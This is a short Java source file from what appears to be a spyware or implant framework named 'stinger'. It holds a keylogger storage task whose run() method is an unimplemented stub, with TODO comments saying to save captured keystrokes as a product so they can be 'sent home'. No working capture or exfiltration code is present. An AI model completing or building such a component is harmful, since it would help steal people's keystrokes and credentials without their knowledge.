package stinger.os.keylogger;

import stinger.StingerEnvironment;

class KeyloggerStoreTask implements Runnable {

    private final Keylogger mKeylogger;
    private final StingerEnvironment mEnvironment;

    KeyloggerStoreTask(Keylogger keylogger, StingerEnvironment environment) {
        mKeylogger = keylogger;
        mEnvironment = environment;
    }

    @Override
    public void run() {
        // TODO: IMPLEMENT
        // this will be called periodically.
        // in here you should save the keylogger data as a product into the storage
        // so it could be sent home.
        // use code you put in Keylogger to access the keylogger data.
        // use StandardProductType.KEY_LOGGER and BinaryProduct/FileProduct (depending on you choice).
    }
}
